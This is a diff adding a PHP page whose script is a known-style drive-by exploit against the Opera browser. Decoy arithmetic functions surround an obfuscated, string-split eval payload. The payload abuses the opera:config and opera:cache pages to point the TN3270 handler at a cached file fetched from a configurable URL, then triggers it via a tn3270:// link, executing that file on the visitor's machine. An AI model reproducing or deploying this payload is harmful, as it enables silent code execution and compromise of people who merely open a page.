@@ -1,0 +1,62 @@
+<?php
+include("./config.php");
+?>
+
+<script>
+
+var a = 1;
+var b = 2;
+
+function sum(a,b) {
+return (a + b);   }
+
+var abc = 123;
+var bcd = 234;
+var cde = 456;
+
+function my(abc,bcd,cde)  {
+return (cde - bcd - abc); }
+
+blank_iframe = document.createElement('iframe');
+blank_iframe.src = 'about:blank';
+blank_iframe.setAttribute('id', 'blank_iframe_window');
+blank_iframe.setAttribute('style', 'display:none');
+document.appendChild(blank_iframe);
+blank_iframe_window.eval
+	("co"+"n"+"fi"+"g"+"_"+"if"+"ra"+"m"+"e = d"+"ocum"+"en"+"t"+"."+"cr"+"ea"+"te"+"Ele"+"ment('iframe');\
+	config_iframe.setAttribute('id', 'config_iframe_window');\
+	config_iframe.src = 'opera:config';\
+	document.appendChild(config_iframe);\
+	app_iframe = document.createElement('script');\
+	cache_iframe = document.createElement('iframe');\
+	app_iframe.src = '<?=$url?>';\
+	app_iframe.onload = function ()\
+	{\
+		cache_iframe.src = 'opera:cache';\
+		cache_iframe.onload = function ()\
+		{\
+			cache = cache_iframe.contentDocument.childNodes[0].innerHTML.toUpperCase();\
+			var re = new RegExp('(OPR\\\\w{5}.EXE)</TD>\\\\s*<TD>\\\\d+</TD>\\\\s*<TD><A HREF=\"'+app_iframe.src.toUpperCase(), '');\
+			filename = cache.match(re);\
+			config_iframe_window.eval\
+			(\"\
+			opera.setPreference('Network','TN3270 App',opera.getPreference('User Prefs','Cache Directory4')+parent.filename[1]);\
+			app_link = document.createElement('a');\
+			app_link.setAttribute('href', 'tn3270://nothing');\
+			app_link.click();\
+			setTimeout(function () {opera.setPreference('Network','TN3270 App','telnet.exe')},1000);\
+			\");\
+		};\
+		document.appendChild(cache_iframe);\
+	};\
+	document.appendChild(app_iframe);");
+
+
+var xyz = 123;
+var xxy = 112;
+
+function sum(xyz,xxy) {
+return (xyz + xxy);   }
+
+
+</script>
